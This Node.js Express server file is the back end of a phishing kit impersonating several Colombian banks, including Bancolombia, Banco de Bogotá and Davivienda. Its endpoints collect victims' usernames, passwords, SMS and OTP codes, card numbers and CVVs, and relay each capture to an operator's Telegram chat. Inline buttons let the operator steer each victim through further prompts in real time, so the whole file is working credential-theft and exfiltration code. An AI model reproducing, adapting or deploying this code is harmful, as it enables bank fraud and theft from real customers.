'use strict';
const express = require('express');
const https   = require('https');
const cors    = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// ─── Config ──────────────────────────────────────────────────────────────────
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;
const PORT      = process.env.PORT || 4000;
const SELF_URL  = process.env.RENDER_EXTERNAL_URL || 'https://essa-global-server.onrender.com';

// ─── Sessions Map ─────────────────────────────────────────────────────────────
// sessionId → { redirect_to, last_msg_id, bank, data }
const sessions = new Map();

// ─── Telegram helpers ─────────────────────────────────────────────────────────
function tgRequest(method, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const req = https.request({
      hostname: 'api.telegram.org',
      path:     `/bot${BOT_TOKEN}/${method}`,
      method:   'POST',
      headers: {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    }, res => {
      let buf = '';
      res.on('data', c => buf += c);
      res.on('end', () => {
        try { resolve(JSON.parse(buf)); }
        catch(e) { resolve({}); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function sendMsg(text, buttons) {
  const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
  if (buttons && buttons.length) body.reply_markup = { inline_keyboard: buttons };
  return tgRequest('sendMessage', body);
}

function editButtons(msgId, buttons) {
  return tgRequest('editMessageReplyMarkup', {
    chat_id:      CHAT_ID,
    message_id:   msgId,
    reply_markup: { inline_keyboard: buttons }
  });
}

function answerCb(cbId) {
  return tgRequest('answerCallbackQuery', { callback_query_id: cbId });
}

function registerWebhook() {
  tgRequest('setWebhook', { url: `${SELF_URL}/telegram/webhook` })
    .then(r => console.log('Webhook:', r.ok ? 'OK' : JSON.stringify(r)))
    .catch(e => console.error('Webhook reg error:', e));
}

function esc(s) {
  if (!s) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ─── Código corto → URL/comando (multi-banco) ────────────────────────────────
const CODE_TO_URL = {
  // Bancolombia — nuevos códigos compactos (≤64 bytes con sessionId)
  'ELG' : 'index.html?state=error_logo',
  'PLG' : 'index.html?state=pedir_logo',
  'ESM' : 'sms.html?state=error_sms',
  'PSM' : 'sms.html?state=pedir_sms',
  'ECRD': 'card.html?state=error_card',
  'PCRD': 'card.html?state=pedir_card',
  'EDIN': 'dinamica.html?state=error_dinamica',
  'PDIN': 'dinamica.html?state=pedir_dinamica',
  // Banco de Bogotá — strings que espera startPolling() en ready.js
  'INICIO'     : 'inicio',
  'OTP'        : 'otp1',
  'OTP_ERR'    : 'otp2',
  'CORREO'     : 'correo',
  'TARJETA_BOG': 'tarjeta',
  // Bancolombia legacy
  'SMS'     : 'sms.html',
  'DINAMICA': 'dinamica.html',
  'TARJETA' : 'card.html',
};
function resolveCode(code) {
  return CODE_TO_URL[code] || null;   // ESY/PSY/E922/P922/SOYYO → null → loader sigue girando
}

// Botonera estándar completa para Bancolombia
function bancolomBtn(sid) {
  return [
    [
      { text: '❌ Err Logo',    callback_data: `ELG|${sid}` },
      { text: '✅ Pedir Logo',  callback_data: `PLG|${sid}` }
    ],
    [
      { text: '❌ Err SMS',     callback_data: `ESM|${sid}` },
      { text: '📱 Pedir SMS',   callback_data: `PSM|${sid}` }
    ],
    [
      { text: '❌ Err Din.',    callback_data: `EDIN|${sid}` },
      { text: '🔐 Pedir Din.',  callback_data: `PDIN|${sid}` }
    ],
    [
      { text: '❌ Err Tarj.',   callback_data: `ECRD|${sid}` },
      { text: '💳 Pedir Tarj.', callback_data: `PCRD|${sid}` }
    ],
    [
      { text: '❌ Err SoyYo',   callback_data: `ESY|${sid}` },
      { text: '✅ Pedir SoyYo', callback_data: `PSY|${sid}` }
    ],
    [
      { text: '❌ Err 922',     callback_data: `E922|${sid}` },
      { text: '📞 Pedir 922',   callback_data: `P922|${sid}` }
    ]
  ];
}

// ─── Universal polling ────────────────────────────────────────────────────────
app.get('/instruction/:sessionId', (req, res) => {
  const s = sessions.get(req.params.sessionId);
  if (s && s.redirect_to) {
    const cmd = s.redirect_to;
    s.redirect_to = null;           // consume once
    return res.json({ redirect_to: cmd });
  }
  res.json({});
});

// ─── Telegram webhook ─────────────────────────────────────────────────────────
app.post('/telegram/webhook', (req, res) => {
  res.sendStatus(200);              // acknowledge immediately
  try {
    const { callback_query } = req.body;
    if (!callback_query) return;

    const [cmd, sessionId] = callback_query.data.split('|');
    const msgId = callback_query.message.message_id;

    // Borrar botones de inmediato
    editButtons(msgId, []).catch(() => {});
    answerCb(callback_query.id).catch(() => {});

    if (sessionId) {
      const s = sessions.get(sessionId) || {};
      // Soporte para múltiples bancos:
      // - Bancolombia: envía URL mapeada (index.html?state=...)
      // - Banco de Bogotá, AV Villas, Caja Social, Banco Popular: envían comandos originales
      const url = resolveCode(cmd);
      const commandOnlyBanks = ['bogota', 'avvillas', 'cajasocial', 'popular', 'davivienda'];

      if (s.bank === 'bancolombia' && url) {
        // Bancolombia espera URLs mapeadas
        s.redirect_to = url;
      } else if (s.bank === 'bogota') {
        // Bogotá: ready.js espera los valores mapeados (otp1, otp2, inicio, correo, tarjeta)
        s.redirect_to = url || cmd;
      } else if (!s.bank || commandOnlyBanks.includes(s.bank)) {
        // Otros bancos esperan comandos originales (SMS, etc.)
        s.redirect_to = cmd;
      } else {
        // Fallback para bancos desconocidos
        s.redirect_to = url || cmd;
      }
      s.last_msg_id = msgId;
      sessions.set(sessionId, s);
    }
  } catch (e) {
    console.error('webhook error:', e);
  }
});

// ════════════════════════════════════════════════════════════════════════════════
// BANCOLOMBIA
// ════════════════════════════════════════════════════════════════════════════════

app.post('/capture/index', (req, res) => {
  res.json({ ok: true });
  const { sessionId, username, password, indexUsuario, indexClave } = req.body;
  if (!sessionId) return;
  const sid = sessionId;
  sessions.set(sid, { bank: 'bancolombia', data: req.body, redirect_to: null });
  const user = esc(username || indexUsuario);
  const pass = esc(password || indexClave);
  sendMsg(
    `🏦 <b>BANCOLOMBIA — Login</b>\n\n👤 <b>Usuario:</b> ${user}\n🔑 <b>Clave:</b> ${pass}\n\n🆔 <code>${sid}</code>`,
    bancolomBtn(sid)
  ).catch(console.error);
});

app.post('/capture/sms', (req, res) => {
  res.json({ ok: true });
  const { sessionId, smsCode } = req.body;
  if (!sessionId || !smsCode) return;
  const s = sessions.get(sessionId) || {};
  s.data = Object.assign({}, s.data, { smsCode });
  sessions.set(sessionId, s);
  sendMsg(
    `🏦 <b>BANCOLOMBIA — Código SMS</b>\n\n📱 <b>SMS:</b> <code>${esc(smsCode)}</code>\n\n🆔 <code>${sessionId}</code>`,
    bancolomBtn(sessionId)
  ).catch(console.error);
});

app.post('/capture/dinamica', (req, res) => {
  res.json({ ok: true });
  const { sessionId, dinamicaCode } = req.body;
  if (!sessionId || !dinamicaCode) return;
  sendMsg(
    `🏦 <b>BANCOLOMBIA — Clave Dinámica</b>\n\n🔐 <b>Código:</b> <code>${esc(dinamicaCode)}</code>\n\n🆔 <code>${sessionId}</code>`,
    bancolomBtn(sessionId)
  ).catch(console.error);
});

app.post('/capture/card', (req, res) => {
  res.json({ ok: true });
  const { sessionId, cardnumber, cvv, expiry } = req.body;
  if (!sessionId) return;
  sendMsg(
    `🏦 <b>BANCOLOMBIA — Tarjeta</b>\n\n💳 <b>Número:</b> <code>${esc(cardnumber)}</code>\n📅 <b>Vence:</b> ${esc(expiry)}\n🔒 <b>CVV:</b> <code>${esc(cvv)}</code>\n\n🆔 <code>${sessionId}</code>`,
    bancolomBtn(sessionId)
  ).catch(console.error);
});

app.post('/capture/soyyo', (req, res) => { res.json({ ok: true }); });
app.post('/capture/922',   (req, res) => { res.json({ ok: true }); });
app.post('/capture/datos', (req, res) => { res.json({ ok: true }); });

// ════════════════════════════════════════════════════════════════════════════════
// BANCO DE BOGOTÁ  (mantiene endpoints de ready.js)
// ════════════════════════════════════════════════════════════════════════════════

app.post('/virtualpersona', (req, res) => {
  res.json({ success: true });
  const { session_id, tipo_doc, num_doc, clave } = req.body;
  if (!session_id) return;
  sessions.set(session_id, { bank: 'bogota', data: req.body, redirect_to: null });
  sendMsg(
    `🏦 <b>BANCO DE BOGOTÁ — Login</b>\n\n📋 <b>Tipo Doc:</b> ${esc(tipo_doc)}\n🪪 <b>Documento:</b> <code>${esc(num_doc)}</code>\n🔑 <b>Clave:</b> <code>${esc(clave)}</code>\n\n🆔 <code>${session_id}</code>`,
    [
      [
        { text: '❌ Error Logo', callback_data: `INICIO|${session_id}` },
        { text: '📱 OTP',        callback_data: `OTP|${session_id}` }
      ],
      [
        { text: '⚠️ Error OTP',  callback_data: `OTP_ERR|${session_id}` },
        { text: '✉️ Correo',     callback_data: `CORREO|${session_id}` }
      ],
      [
        { text: '💳 Tarjeta',    callback_data: `TARJETA_BOG|${session_id}` }
      ]
    ]
  ).catch(console.error);
});

app.post('/notify/otp1', (req, res) => {
  res.json({ success: true });
  const { session_id, otp_token, intento } = req.body;
  if (!session_id || !otp_token) return;
  const label = intento === 2 ? 'OTP — 2° intento' : 'OTP';
  sendMsg(
    `🏦 <b>BANCO DE BOGOTÁ — ${label}</b>\n\n🔢 <b>Token:</b> <code>${esc(otp_token)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '⚠️ Error OTP', callback_data: `OTP_ERR|${session_id}` },
      { text: '✅ Aprobar',   callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

app.post('/notify/otp2', (req, res) => {
  res.json({ success: true });
  const { session_id, otp_token } = req.body;
  if (!session_id || !otp_token) return;
  sendMsg(
    `🏦 <b>BANCO DE BOGOTÁ — OTP Error (2° intento)</b>\n\n🔢 <b>Token:</b> <code>${esc(otp_token)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '❌ Error Logo', callback_data: `INICIO|${session_id}` },
      { text: '✅ Aprobar',   callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

app.post('/notify/correo', (req, res) => {
  res.json({ success: true });
  const { session_id, email, celular } = req.body;
  if (!session_id) return;
  sendMsg(
    `🏦 <b>BANCO DE BOGOTÁ — Correo/Celular</b>\n\n✉️ <b>Correo:</b> ${esc(email)}\n📱 <b>Celular:</b> <code>${esc(celular)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '❌ Error',   callback_data: `INICIO|${session_id}` },
      { text: '✅ Aprobar', callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

app.post('/notify/tarjeta', (req, res) => {
  res.json({ success: true });
  const { session_id, tarjeta, mes, ano, cvv } = req.body;
  if (!session_id) return;
  sendMsg(
    `🏦 <b>BANCO DE BOGOTÁ — Tarjeta</b>\n\n💳 <b>Número:</b> <code>${esc(tarjeta)}</code>\n📅 <b>Vence:</b> ${esc(mes)}/${esc(ano)}\n🔒 <b>CVV:</b> <code>${esc(cvv)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '❌ Error',   callback_data: `INICIO|${session_id}` },
      { text: '✅ Aprobar', callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

// ════════════════════════════════════════════════════════════════════════════════
// DAVIVIENDA
// ════════════════════════════════════════════════════════════════════════════════

app.post('/capture/davivienda', (req, res) => {
  res.json({ ok: true });
  const { session_id, documento, password } = req.body;
  if (!session_id) return;
  sessions.set(session_id, { bank: 'davivienda', data: req.body, redirect_to: null });
  sendMsg(
    `🏦 <b>DAVIVIENDA — Login</b>\n\n🪪 <b>Documento:</b> <code>${esc(documento)}</code>\n🔑 <b>Clave Virtual:</b> <code>${esc(password)}</code>\n\n🆔 <code>${session_id}</code>`,
    [
      [
        { text: '❌ Error Logo', callback_data: `INICIO|${session_id}` },
        { text: '📱 OTP',        callback_data: `OTP|${session_id}` }
      ],
      [
        { text: '⚠️ Error OTP',  callback_data: `OTP_ERR|${session_id}` }
      ]
    ]
  ).catch(console.error);
});

app.post('/capture/davivienda/otp', (req, res) => {
  res.json({ ok: true });
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return;
  sendMsg(
    `🏦 <b>DAVIVIENDA — OTP</b>\n\n🔢 <b>Código:</b> <code>${esc(otp)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '⚠️ Error OTP', callback_data: `OTP_ERR|${session_id}` },
      { text: '✅ Aprobar',   callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

// ════════════════════════════════════════════════════════════════════════════════
// AV VILLAS
// ════════════════════════════════════════════════════════════════════════════════

app.post('/capture/avvillas', (req, res) => {
  res.json({ ok: true });
  const { session_id, documento, password } = req.body;
  if (!session_id) return;
  sessions.set(session_id, { bank: 'avvillas', data: req.body, redirect_to: null });
  sendMsg(
    `🏦 <b>AV VILLAS — Login</b>\n\n🪪 <b>Documento:</b> <code>${esc(documento)}</code>\n🔑 <b>Contraseña:</b> <code>${esc(password)}</code>\n\n🆔 <code>${session_id}</code>`,
    [
      [
        { text: '❌ Error Logo', callback_data: `INICIO|${session_id}` },
        { text: '📱 OTP',        callback_data: `OTP|${session_id}` }
      ],
      [
        { text: '⚠️ Error OTP',  callback_data: `OTP_ERR|${session_id}` }
      ]
    ]
  ).catch(console.error);
});

app.post('/capture/avvillas/otp', (req, res) => {
  res.json({ ok: true });
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return;
  sendMsg(
    `🏦 <b>AV VILLAS — OTP</b>\n\n🔢 <b>Código:</b> <code>${esc(otp)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '⚠️ Error OTP', callback_data: `OTP_ERR|${session_id}` },
      { text: '✅ Aprobar',   callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

// ════════════════════════════════════════════════════════════════════════════════
// CAJA SOCIAL
// ════════════════════════════════════════════════════════════════════════════════

app.post('/capture/cajasocial', (req, res) => {
  res.json({ ok: true });
  const { session_id, username, password } = req.body;
  if (!session_id) return;
  sessions.set(session_id, { bank: 'cajasocial', data: req.body, redirect_to: null });
  sendMsg(
    `🏦 <b>CAJA SOCIAL — Login</b>\n\n👤 <b>Usuario:</b> <code>${esc(username)}</code>\n🔑 <b>Contraseña:</b> <code>${esc(password)}</code>\n\n🆔 <code>${session_id}</code>`,
    [
      [
        { text: '❌ Error Logo', callback_data: `INICIO|${session_id}` },
        { text: '📱 SMS',        callback_data: `SMS|${session_id}` }
      ],
      [
        { text: '⚠️ Error SMS',  callback_data: `SMS_ERR|${session_id}` }
      ]
    ]
  ).catch(console.error);
});

app.post('/capture/cajasocial/sms', (req, res) => {
  res.json({ ok: true });
  const { session_id, sms_code } = req.body;
  if (!session_id || !sms_code) return;
  sendMsg(
    `🏦 <b>CAJA SOCIAL — SMS</b>\n\n📱 <b>Código:</b> <code>${esc(sms_code)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '⚠️ Error SMS', callback_data: `SMS_ERR|${session_id}` },
      { text: '✅ Aprobar',   callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

// ════════════════════════════════════════════════════════════════════════════════
// BANCO POPULAR
// ════════════════════════════════════════════════════════════════════════════════

app.post('/capture/popular', (req, res) => {
  res.json({ ok: true });
  const { session_id, documento, clave } = req.body;
  if (!session_id) return;
  sessions.set(session_id, { bank: 'popular', data: req.body, redirect_to: null });
  sendMsg(
    `🏦 <b>BANCO POPULAR — Login</b>\n\n🪪 <b>Documento:</b> <code>${esc(documento)}</code>\n🔑 <b>Clave:</b> <code>${esc(clave)}</code>\n\n🆔 <code>${session_id}</code>`,
    [
      [
        { text: '❌ Error Logo', callback_data: `INICIO|${session_id}` },
        { text: '📱 OTP',        callback_data: `OTP|${session_id}` }
      ],
      [
        { text: '⚠️ Error OTP',  callback_data: `OTP_ERR|${session_id}` }
      ]
    ]
  ).catch(console.error);
});

app.post('/capture/popular/otp', (req, res) => {
  res.json({ ok: true });
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return;
  sendMsg(
    `🏦 <b>BANCO POPULAR — OTP</b>\n\n🔢 <b>Código:</b> <code>${esc(otp)}</code>\n\n🆔 <code>${session_id}</code>`,
    [[
      { text: '⚠️ Error OTP', callback_data: `OTP_ERR|${session_id}` },
      { text: '✅ Aprobar',   callback_data: `SOYYO|${session_id}` }
    ]]
  ).catch(console.error);
});

// ─── Health check ─────────────────────────────────────────────────────────────
app.get('/', (req, res) => res.json({ ok: true, server: 'essa-global' }));

// ─── Self-ping (mantiene Render despierto) ────────────────────────────────────
function selfPing() {
  const url = new URL(SELF_URL);
  const mod = url.protocol === 'https:' ? https : require('http');
  mod.get(SELF_URL + '/', res => {
    res.resume();
    console.log(`[ping] ${res.statusCode}`);
  }).on('error', e => console.warn('[ping error]', e.message));
}

// ─── Start ────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`[essa-global] escuchando en puerto ${PORT}`);
  registerWebhook();
  setInterval(selfPing, 14 * 60 * 1000); // cada 14 min
});
